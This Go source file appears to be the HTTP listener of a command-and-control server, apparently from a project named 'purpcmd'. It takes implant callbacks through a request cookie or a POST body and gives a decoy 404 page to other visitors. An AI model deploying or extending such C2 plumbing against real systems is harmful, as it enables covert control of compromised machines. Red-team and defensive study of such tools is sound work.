package listener

import (
	"io"
	"net/http"
	"purpcmd/server/implant"
	"strings"
)

func root(w http.ResponseWriter, r *http.Request) {
	var a int
	
	if r.Method == "GET" {
		cookies := r.Cookies()
		if len(cookies) == 0 {
			a = implant.NIL
		} else {
			stringReader := strings.NewReader(cookies[0].Value)
			stringReadCloser := io.NopCloser(stringReader)

			a = implant.ParseCallback(stringReadCloser)
		}

	} else if r.Method == "POST" {
		a = implant.ParseCallback(r.Body)
	}

	if a == implant.NIL {
		w.WriteHeader(404)
		w.Write([]byte("Page Not Found"))
		return
	}

	w.WriteHeader(200)
	w.Write([]byte("Hi!"))
}